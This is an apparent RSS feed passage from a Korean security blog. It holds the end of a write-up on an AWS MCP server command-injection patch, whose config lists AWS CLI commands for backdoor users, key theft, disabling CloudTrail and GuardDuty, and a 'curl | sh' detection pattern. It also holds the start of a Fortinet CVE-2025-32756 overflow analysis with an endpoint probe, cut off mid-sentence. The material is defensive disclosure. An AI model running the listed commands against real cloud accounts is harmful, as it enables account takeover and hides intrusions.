&#xC0BD;&#xC785;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xB294; root, admin &#xB4F1; &#xBBFC;&#xAC10;&#xD55C; &#xC720;&#xC800;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4; &#xC720;&#xCD9C;, &#xC2DC;&#xC2A4;&#xD15C; &#xC124;&#xC815; &#xD30C;&#xC77C; &#xC720;&#xCD9C; &#xB4F1;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_aws_command</span>(<span class="hljs-params">command: str</span>) -&gt; <span class="hljs-keyword">None</span>:</span>    <span class="hljs-string">&quot;&quot;&quot;Validate that the command is a proper AWS CLI command.</span><span class="hljs-string">    ...</span><span class="hljs-string">    &quot;&quot;&quot;</span><span class="hljs-comment">#...</span>    <span class="hljs-comment"># Check regex rules first (these apply regardless of service)</span>    error_message = check_regex_rules(command, service)     <span class="hljs-keyword">if</span> error_message:        <span class="hljs-keyword">raise</span> ValueError(error_message)    <span class="hljs-comment"># Check against dangerous commands for this service</span>    <span class="hljs-keyword">if</span> service <span class="hljs-keyword">in</span> SECURITY_CONFIG.dangerous_commands:        <span class="hljs-comment"># Check each dangerous command pattern</span>        <span class="hljs-keyword">for</span> dangerous_cmd <span class="hljs-keyword">in</span> SECURITY_CONFIG.dangerous_commands[service]:            <span class="hljs-keyword">if</span> command.startswith(dangerous_cmd):                <span class="hljs-comment"># If it&apos;s a dangerous command, check if it&apos;s also in safe patterns</span>                <span class="hljs-keyword">if</span> is_service_command_safe(command, service):                     <span class="hljs-keyword">return</span>  <span class="hljs-comment"># Command is safe despite matching dangerous pattern</span>                <span class="hljs-comment"># Command is dangerous, raise an error</span>                <span class="hljs-keyword">raise</span> ValueError(                    <span class="hljs-string">f&quot;This command (<span class="hljs-subst">{dangerous_cmd}</span>) is restricted for security reasons. &quot;</span>                    <span class="hljs-string">f&quot;Please use a more specific, read-only command or add &apos;help&apos; or &apos;--help&apos; to see available options.&quot;</span>                )    logger.debug(<span class="hljs-string">f&quot;Command validation successful: <span class="hljs-subst">{command}</span>&quot;</span>)<span class="hljs-comment">#... </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_regex_rules</span>(<span class="hljs-params">command: str, service: Optional[str] = None</span>) -&gt; Optional[str]:</span>More actions    <span class="hljs-string">&quot;&quot;&quot;Check command against regex rules.</span><span class="hljs-string"></span><span class="hljs-string">    Args:</span><span class="hljs-string">        command: The command to check</span><span class="hljs-string">        service: The AWS service being used, if known</span><span class="hljs-string"></span><span class="hljs-string">    Returns:</span><span class="hljs-string">        Error message if command matches a regex rule, None otherwise</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-comment"># Check general rules that apply to all commands</span>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;general&quot;</span> <span class="hljs-keyword">in</span> SECURITY_CONFIG.regex_rules:        <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> SECURITY_CONFIG.regex_rules[<span class="hljs-string">&quot;general&quot;</span>]:            pattern = re.compile(rule.pattern)            <span class="hljs-keyword">if</span> pattern.search(command):                logger.warning(<span class="hljs-string">f&quot;Command matches regex rule: <span class="hljs-subst">{rule.description}</span>&quot;</span>)                <span class="hljs-keyword">return</span> rule.error_message    <span class="hljs-comment"># Check service-specific rules if service is provided</span>    <span class="hljs-keyword">if</span> service <span class="hljs-keyword">and</span> service <span class="hljs-keyword">in</span> SECURITY_CONFIG.regex_rules:        <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> SECURITY_CONFIG.regex_rules[service]:            pattern = re.compile(rule.pattern)            <span class="hljs-keyword">if</span> pattern.search(command):                logger.warning(<span class="hljs-string">f&quot;Command matches service-specific regex rule for <span class="hljs-subst">{service}</span>: <span class="hljs-subst">{rule.description}</span>&quot;</span>)                <span class="hljs-keyword">return</span> rule.error_message    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre><p>&#xD328;&#xCE58;&#xB294; &#xAE30;&#xC874;&#xC5D0; <code>validate_aws_command()</code> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC4F0;&#xC600;&#xB358; <code>dangerous_command</code> &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; config&#xB85C; &#xBD84;&#xB9AC;&#xD568;&#xD574; &#xD655;&#xC7A5; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD55C; &#xB3D9;&#xC2DC;&#xC5D0; &#xAC80;&#xC99D;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC600;&#xC73C;&#xBA70;, &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; <code>check_regex_rules</code> &#xD568;&#xC218; &#xB610;&#xD55C; &#xCD94;&#xAC00;&#xD574; &#xAC80;&#xC99D;&#xC744; &#xAC15;&#xD654;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; &#xC815;&#xADDC;&#xC2DD; &#xAC80;&#xC99D;&#xACFC; <code>dangerous_command</code> &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; config &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>SECURITY_CONFIG (example)</li></ul><pre><code class="hljs python"><span class="hljs-comment">#...</span><span class="hljs-comment"># Commands considered dangerous by security category</span><span class="hljs-comment"># Keys are AWS service names, values are lists of command prefixes to block</span>dangerous_commands:  <span class="hljs-comment"># Identity and Access Management - core of security</span>  iam:    <span class="hljs-comment"># User management (potential backdoor accounts)</span>    - <span class="hljs-string">&quot;aws iam create-user&quot;</span>              <span class="hljs-comment"># Creates new IAM users that could persist after compromise</span>    - <span class="hljs-string">&quot;aws iam update-user&quot;</span>              <span class="hljs-comment"># Updates existing user properties</span>        <span class="hljs-comment"># Credential management (theft risk)</span>    - <span class="hljs-string">&quot;aws iam create-access-key&quot;</span>        <span class="hljs-comment"># Creates long-term credentials that can be exfiltrated</span>    - <span class="hljs-string">&quot;aws iam update-access-key&quot;</span>        <span class="hljs-comment"># Changes status of access keys (enabling/disabling)</span>    - <span class="hljs-string">&quot;aws iam create-login-profile&quot;</span>     <span class="hljs-comment"># Creates console passwords for existing users</span>    - <span class="hljs-string">&quot;aws iam update-login-profile&quot;</span>     <span class="hljs-comment"># Updates console passwords</span>        <span class="hljs-comment"># Authentication controls</span>    - <span class="hljs-string">&quot;aws iam create-virtual-mfa-device&quot;</span> <span class="hljs-comment"># Creates new MFA devices</span>    - <span class="hljs-string">&quot;aws iam deactivate-mfa-device&quot;</span>    <span class="hljs-comment"># Removes MFA protection from accounts</span>    - <span class="hljs-string">&quot;aws iam delete-virtual-mfa-device&quot;</span> <span class="hljs-comment"># Deletes MFA devices</span>    - <span class="hljs-string">&quot;aws iam enable-mfa-device&quot;</span>        <span class="hljs-comment"># Enables/associates MFA devices</span>        <span class="hljs-comment"># Privilege escalation via policy manipulation</span>    - <span class="hljs-string">&quot;aws iam attach-user-policy&quot;</span>       <span class="hljs-comment"># Attaches managed policies to users</span>    - <span class="hljs-string">&quot;aws iam attach-role-policy&quot;</span>       <span class="hljs-comment"># Attaches managed policies to roles</span>    - <span class="hljs-string">&quot;aws iam attach-group-policy&quot;</span>      <span class="hljs-comment"># Attaches managed policies to groups</span>    - <span class="hljs-string">&quot;aws iam create-policy&quot;</span>            <span class="hljs-comment"># Creates new managed policies</span>    - <span class="hljs-string">&quot;aws iam create-policy-version&quot;</span>    <span class="hljs-comment"># Creates new versions of managed policies</span>    - <span class="hljs-string">&quot;aws iam set-default-policy-version&quot;</span> <span class="hljs-comment"># Changes active policy version</span>        <span class="hljs-comment"># Inline policy manipulation (harder to detect)</span>    - <span class="hljs-string">&quot;aws iam put-user-policy&quot;</span>          <span class="hljs-comment"># Creates/updates inline policies for users</span>    - <span class="hljs-string">&quot;aws iam put-role-policy&quot;</span>          <span class="hljs-comment"># Creates/updates inline policies for roles</span>    - <span class="hljs-string">&quot;aws iam put-group-policy&quot;</span>         <span class="hljs-comment"># Creates/updates inline policies for groups</span>        <span class="hljs-comment"># Trust relationship manipulation</span>    - <span class="hljs-string">&quot;aws iam update-assume-role-policy&quot;</span> <span class="hljs-comment"># Changes who can assume a role</span>    - <span class="hljs-string">&quot;aws iam update-role&quot;</span>              <span class="hljs-comment"># Updates role properties</span>    <span class="hljs-comment"># Security Token Service - temporary credentials</span>  sts:    - <span class="hljs-string">&quot;aws sts assume-role&quot;</span>              <span class="hljs-comment"># Assumes roles with potentially higher privileges</span>    - <span class="hljs-string">&quot;aws sts get-federation-token&quot;</span>     <span class="hljs-comment"># Gets federated access tokens</span>    <span class="hljs-comment"># AWS Organizations - multi-account management</span>  organizations:    - <span class="hljs-string">&quot;aws organizations create-account&quot;</span>  <span class="hljs-comment"># Creates new AWS accounts</span>    - <span class="hljs-string">&quot;aws organizations invite-account-to-organization&quot;</span> <span class="hljs-comment"># Brings accounts under org control</span>    - <span class="hljs-string">&quot;aws organizations leave-organization&quot;</span> <span class="hljs-comment"># Removes accounts from organization</span>    - <span class="hljs-string">&quot;aws organizations remove-account-from-organization&quot;</span> <span class="hljs-comment"># Removes accounts from organization</span>    - <span class="hljs-string">&quot;aws organizations disable-policy-type&quot;</span> <span class="hljs-comment"># Disables policy enforcement</span>    - <span class="hljs-string">&quot;aws organizations create-policy&quot;</span>   <span class="hljs-comment"># Creates organization policies</span>    - <span class="hljs-string">&quot;aws organizations attach-policy&quot;</span>   <span class="hljs-comment"># Attaches organization policies</span>  <span class="hljs-comment"># ---------------------------------------------------------------------------------</span>  <span class="hljs-comment"># &#x1F50D; Audit and Logging Security Rules</span>  <span class="hljs-comment"># ---------------------------------------------------------------------------------</span>  <span class="hljs-comment"># These rules prevent attackers from covering their tracks by:</span>  <span class="hljs-comment"># - Disabling or deleting audit logs (CloudTrail)</span>  <span class="hljs-comment"># - Turning off compliance monitoring (Config)</span>  <span class="hljs-comment"># - Disabling threat detection (GuardDuty)</span>  <span class="hljs-comment"># - Removing alarm systems (CloudWatch)</span>  <span class="hljs-comment"># ---------------------------------------------------------------------------------</span>    <span class="hljs-comment"># CloudTrail - AWS activity logging</span>  cloudtrail:    - <span class="hljs-string">&quot;aws cloudtrail delete-trail&quot;</span>       <span class="hljs-comment"># Removes audit trail completely</span>    - <span class="hljs-string">&quot;aws cloudtrail stop-logging&quot;</span>       <span class="hljs-comment"># Stops collecting audit logs</span>    - <span class="hljs-string">&quot;aws cloudtrail update-trail&quot;</span>       <span class="hljs-comment"># Modifies logging settings (e.g., disabling logging)</span>    - <span class="hljs-string">&quot;aws cloudtrail put-event-selectors&quot;</span> <span class="hljs-comment"># Changes what events are logged</span>    - <span class="hljs-string">&quot;aws cloudtrail delete-event-data-store&quot;</span> <span class="hljs-comment"># Deletes storage for CloudTrail events</span>    <span class="hljs-comment"># AWS Config - configuration monitoring</span>  config:    - <span class="hljs-string">&quot;aws configservice delete-configuration-recorder&quot;</span> <span class="hljs-comment"># Removes configuration tracking</span>    - <span class="hljs-string">&quot;aws configservice stop-configuration-recorder&quot;</span>   <span class="hljs-comment"># Stops recording configuration changes</span>    - <span class="hljs-string">&quot;aws configservice delete-delivery-channel&quot;</span>       <span class="hljs-comment"># Stops delivering configuration snapshots</span>    - <span class="hljs-string">&quot;aws configservice delete-remediation-configuration&quot;</span> <span class="hljs-comment"># Removes auto-remediation</span>    <span class="hljs-comment"># GuardDuty - threat detection</span>  guardduty:    - <span class="hljs-string">&quot;aws guardduty delete-detector&quot;</span>     <span class="hljs-comment"># Disables threat detection completely</span>    - <span class="hljs-string">&quot;aws guardduty disable-organization-admin-account&quot;</span> <span class="hljs-comment"># Disables central security</span>    - <span class="hljs-string">&quot;aws guardduty update-detector&quot;</span>     <span class="hljs-comment"># Modifies threat detection settings</span>    <span class="hljs-comment"># CloudWatch - monitoring and alerting</span>  cloudwatch:    - <span class="hljs-string">&quot;aws cloudwatch delete-alarms&quot;</span>     <span class="hljs-comment"># Removes security alarm configurations</span>    - <span class="hljs-string">&quot;aws cloudwatch disable-alarm-actions&quot;</span> <span class="hljs-comment"># Disables alarm action triggers</span>    - <span class="hljs-string">&quot;aws cloudwatch delete-dashboards&quot;</span> <span class="hljs-comment"># Removes monitoring dashboards</span><span class="hljs-comment"># Complex pattern matching using regular expressions</span>regex_rules:  <span class="hljs-comment"># Global security patterns (apply to all services)</span>  general:    <span class="hljs-comment"># Identity and authentication risks</span>    - pattern: <span class="hljs-string">&quot;aws .* --profile\\s+(root|admin|administrator)&quot;</span>      description: <span class="hljs-string">&quot;Prevent use of sensitive profiles&quot;</span>      error_message: <span class="hljs-string">&quot;Using sensitive profiles (root, admin) is restricted for security reasons.&quot;</span>        <span class="hljs-comment"># Protocol security risks</span>    - pattern: <span class="hljs-string">&quot;aws .* --no-verify-ssl&quot;</span>      description: <span class="hljs-string">&quot;Prevent disabling SSL verification&quot;</span>      error_message: <span class="hljs-string">&quot;Disabling SSL verification is not allowed for security reasons.&quot;</span>        <span class="hljs-comment"># Data exposure risks</span>    - pattern: <span class="hljs-string">&quot;aws .* --output\\s+text\\s+.*--query\\s+.*Password&quot;</span>      description: <span class="hljs-string">&quot;Prevent password exposure in text output&quot;</span>      error_message: <span class="hljs-string">&quot;Outputting sensitive data like passwords in text format is restricted.&quot;</span>        <span class="hljs-comment"># Debug mode risks</span>    - pattern: <span class="hljs-string">&quot;aws .* --debug&quot;</span>      description: <span class="hljs-string">&quot;Prevent debug mode which shows sensitive info&quot;</span>      error_message: <span class="hljs-string">&quot;Debug mode is restricted as it may expose sensitive information.&quot;</span>  <span class="hljs-comment"># IAM-specific security patterns</span>  iam:    <span class="hljs-comment"># Privileged user creation</span>    - pattern: <span class="hljs-string">&quot;aws iam create-user.*--user-name\\s+(root|admin|administrator|backup|security|finance|billing)&quot;</span>      description: <span class="hljs-string">&quot;Prevent creation of privileged-sounding users&quot;</span>      error_message: <span class="hljs-string">&quot;Creating users with sensitive names is restricted for security reasons.&quot;</span>        <span class="hljs-comment"># Privilege escalation via policies</span>    - pattern: <span class="hljs-string">&quot;aws iam attach-user-policy.*--policy-arn\\s+.*Administrator&quot;</span>      description: <span class="hljs-string">&quot;Prevent attaching Administrator policies&quot;</span>      error_message: <span class="hljs-string">&quot;Attaching Administrator policies is restricted for security reasons.&quot;</span>        - pattern: <span class="hljs-string">&quot;aws iam attach-user-policy.*--policy-arn\\s+.*FullAccess&quot;</span>      description: <span class="hljs-string">&quot;Prevent attaching FullAccess policies to users&quot;</span>      error_message: <span class="hljs-string">&quot;Attaching FullAccess policies directly to users is restricted (use roles instead).&quot;</span>        <span class="hljs-comment"># Unrestricted permissions in policies</span>    - pattern: <span class="hljs-string">&quot;aws iam create-policy.*\&quot;Effect\&quot;:\\s*\&quot;Allow\&quot;.*\&quot;Action\&quot;:\\s*\&quot;\*\&quot;.*\&quot;Resource\&quot;:\\s*\&quot;\*\&quot;&quot;</span>      description: <span class="hljs-string">&quot;Prevent creation of policies with * permissions&quot;</span>      error_message: <span class="hljs-string">&quot;Creating policies with unrestricted (*) permissions is not allowed.&quot;</span>        <span class="hljs-comment"># Password policy weakening</span>    - pattern: <span class="hljs-string">&quot;aws iam create-login-profile.*--password-reset-required\\s+false&quot;</span>      description: <span class="hljs-string">&quot;Enforce password reset for new profiles&quot;</span>      error_message: <span class="hljs-string">&quot;Creating login profiles without requiring password reset is restricted.&quot;</span>        - pattern: <span class="hljs-string">&quot;aws iam update-account-password-policy.*--require-uppercase-characters\\s+false&quot;</span>      description: <span class="hljs-string">&quot;Prevent weakening password policies&quot;</span>      error_message: <span class="hljs-string">&quot;Weakening account password policies is restricted.&quot;</span>  <span class="hljs-comment"># S3 security patterns</span>  s3:    <span class="hljs-comment"># Public bucket exposure</span>    - pattern: <span class="hljs-string">&quot;aws s3api put-bucket-policy.*\&quot;Effect\&quot;:\\s*\&quot;Allow\&quot;.*\&quot;Principal\&quot;:\\s*\&quot;\*\&quot;&quot;</span>      description: <span class="hljs-string">&quot;Prevent public bucket policies&quot;</span>      error_message: <span class="hljs-string">&quot;Creating public bucket policies is restricted for security reasons.&quot;</span>        <span class="hljs-comment"># Disabling public access blocks</span>    - pattern: <span class="hljs-string">&quot;aws s3api put-public-access-block.*--public-access-block-configuration\\s+.*\&quot;BlockPublicAcls\&quot;:\\s*false&quot;</span>      description: <span class="hljs-string">&quot;Prevent disabling public access blocks&quot;</span>      error_message: <span class="hljs-string">&quot;Disabling S3 public access blocks is restricted for security reasons.&quot;</span>        <span class="hljs-comment"># Public bucket creation outside approved regions</span>    - pattern: <span class="hljs-string">&quot;aws s3api create-bucket.*--region\\s+(?!eu|us-east-1).*--acl\\s+public&quot;</span>      description: <span class="hljs-string">&quot;Prevent public buckets outside of allowed regions&quot;</span>      error_message: <span class="hljs-string">&quot;Creating public buckets outside allowed regions is restricted.&quot;</span>  <span class="hljs-comment"># EC2 network security patterns</span>  ec2:    <span class="hljs-comment"># Open security groups for sensitive ports</span>    - pattern: <span class="hljs-string">&quot;aws ec2 authorize-security-group-ingress.*--cidr\\s+0\\.0\\.0\\.0/0.*--port\\s+(?!80|443)[0-9]+&quot;</span>      description: <span class="hljs-string">&quot;Prevent open security groups for non-web ports&quot;</span>      error_message: <span class="hljs-string">&quot;Opening non-web ports to the entire internet (0.0.0.0/0) is restricted.&quot;</span>        <span class="hljs-comment"># Unsafe user-data scripts</span>    - pattern: <span class="hljs-string">&quot;aws ec2 run-instances.*--user-data\\s+.*curl.*\\|.*sh&quot;</span>      description: <span class="hljs-string">&quot;Detect potentially unsafe user-data scripts&quot;</span>      error_message: <span class="hljs-string">&quot;Running scripts from remote sources in user-data presents security risks.&quot;</span>  <span class="hljs-comment"># CloudTrail integrity patterns</span>  cloudtrail:    <span class="hljs-comment"># Disabling global event logging</span>    - pattern: <span class="hljs-string">&quot;aws cloudtrail update-trail.*--no-include-global-service-events&quot;</span>      description: <span class="hljs-string">&quot;Prevent disabling global event logging&quot;</span>      error_message: <span class="hljs-string">&quot;Disabling CloudTrail logging for global service events is restricted.&quot;</span>        <span class="hljs-comment"># Making trails single-region</span>    - pattern: <span class="hljs-string">&quot;aws cloudtrail update-trail.*--no-multi-region&quot;</span>      description: <span class="hljs-string">&quot;Prevent making trails single-region&quot;</span>      error_message: <span class="hljs-string">&quot;Changing CloudTrail trails from multi-region to single-region is restricted.&quot;</span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/command-injection/">command injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/aws/">aws</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mcp/">mcp</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/31/l0ch/2025-05-31/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-32756: Fortinet admin API에서 발생한 Stack-based Buffer Overflow</title>
      <link>https://hackyboiz.github.io/2025/05/29/clalxk/CVE-2025-32756/</link>
      <guid>https://hackyboiz.github.io/2025/05/29/clalxk/CVE-2025-32756/</guid>
      <pubDate>Thu, 29 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.fortiguard.com/psirt/FG-IR-24-123&quot;&gt;http</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.fortiguard.com/psirt/FG-IR-24-123">https://www.fortiguard.com/psirt/FG-IR-24-123</a></li><li><a href="https://fortiguard.fortinet.com/psirt/FG-IR-25-254">https://fortiguard.fortinet.com/psirt/FG-IR-25-254</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>FortiCamera 2.1 &#x2264; v2.1.3</li><li>FortiMail 7.6 &#x2264; v7.6.2</li><li>FortiNDR 7.6 = v7.6.0</li><li>FortiRecorder 7.2 &#x2264; v7.2.3</li><li>FortiVoice 7.2 = v7.2.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="CVE-2025-32756"><a href="#CVE-2025-32756" class="headerlink" title="CVE-2025-32756"></a>CVE-2025-32756</h3><p>2025&#xB144; 5&#xC6D4; 13&#xC77C;, FortiGuard Labs&#xB294; Fortinet&#xC758; &#xC5EC;&#xB7EC; &#xC81C;&#xD488;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; <strong>CVE-2025-32756</strong>&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>FortiCamera, FortiMail, FortiNDR, FortiRecorder, FortiVoice</code> &#xC81C;&#xD488;&#xC774; &#xD574;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAD00;&#xB9AC;&#xC790; API&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB85C;, &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>&#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC704;&#xD574; FortiMail&#xC758; &#xD328;&#xCE58; &#xC804;&#xD6C4; &#xBC84;&#xC804;&#xC744; &#xBE44;&#xAD50; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC1C;&#xD45C;&#xBB38;&#xC5D0; &#xB098;&#xC5F4;&#xB41C; &#xCE68;&#xD574; &#xC9C0;&#xD45C;(IOCs)&#xB294; &#xBD84;&#xC11D;&#xC744; &#xC5B4;&#xB514;&#xC11C; &#xC2DC;&#xC791;&#xD560;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xB2E8;&#xC11C;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image.png" alt="image.png"></p><p><a href="https://fortiguard.fortinet.com/psirt/FG-IR-25-254">https://fortiguard.fortinet.com/psirt/FG-IR-25-254</a></p><p>&#xD574;&#xB2F9; &#xB85C;&#xADF8;&#xB97C; &#xBCF4;&#xBA74; &#xBA87; &#xAC00;&#xC9C0; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. admin.fe CGI &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD560; &#xB54C;, &#xC6F9; &#xC11C;&#xBC84;&#xAC00; mod_fcgid&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9CC;&#xC57D; &#xC2E4;&#xD328;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC11C;&#xBC84; &#xC804;&#xCCB4;&#xAC00; &#xBA48;&#xCD94;&#xAC70;&#xB098; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xCC28;&#xB2E8;&#xB420; &#xC704;&#xD5D8;&#xC740; &#xD06C;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6F9; &#xC11C;&#xBC84; &#xC124;&#xC815; &#xD30C;&#xC77C; (<code>httpd.conf</code>)&#xC5D0;&#xC11C;  <code>ScriptAlias /module/ &quot;/migadmin/www/fcgi/&quot;</code> &#xC9C4;&#xC785;&#xC810;&#xC744; &#xCC3E;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xAC04;&#xB2E8;&#xD55C; <code>curl</code> &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; <code>admin.fe</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-comment"># curl -k -L -v https://REDACTED/module/admin.fe</span>&lt; HTTP/1.1 200 OK&lt; Date: Tue, 20 May 2025 23:17:44 GMT&lt; Cache-Control: no-cache&lt; Strict-Transport-Security: max-age=31536000; includeSubDomains&lt; Set-Cookie: **APSCOOKIE_ffbe3e4d0e3350075e9c91f574e799cc**=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: ParamStr=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: mTime=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: logLevel=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: logType=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: logStartline=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: logDomain=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: totalLineNumber=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Set-Cookie: SearchResultFile=; Expires=Fri, 01-Jan-1971 01:00:00 GMT;; Path=/; Version=1; Secure; HttpOnly&lt; Vary: Accept-Encoding&lt; X-XSS-Protection: 1; mode=block&lt; X-Frame-Options: SAMEORIGIN&lt; X-Content-Type-Options: nosniff&lt; Content-Security-Policy: script-src <span class="hljs-string">&apos;self&apos;</span>; object-src <span class="hljs-string">&apos;none&apos;</span>; frame-ancestors <span class="hljs-string">&apos;self&apos;</span> https://*.fortimailcloud.com/ https://fortimail.forticloud.com/&lt; Transfer-Encoding: chunked&lt; Content-Type: text/plain&lt;{<span class="hljs-string">&quot;errorType&quot;</span>: 7,<span class="hljs-string">&quot;errorMsg&quot;</span>: <span class="hljs-string">&quot;Failed: Access denied&quot;</span>,<span class="hljs-string">&quot;reqAction&quot;</span>: 0,<span class="hljs-string">&quot;totalRemoteCount&quot;</span>: 0,<span class="hljs-string">&quot;collection&quot;</span>: <span class="hljs-string">&quot;[]&quot;</span>}</code></pre><p>&#xC774; &#xC751;&#xB2F5;&#xC744; &#xD1B5;&#xD574;  <code>admin.fe</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC;, <strong>&#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC70;&#xBD80;</strong>&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xC804;&#xC758; <code>admin.fe</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBE44;&#xAD50;&#xD574;&#xBCF8; &#xACB0;&#xACFC;, &#xB450; &#xD30C;&#xC77C;&#xC740; &#xB3D9;&#xC77C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xC720; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xC788;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image1.png" alt="image.png"></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; Boost &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; 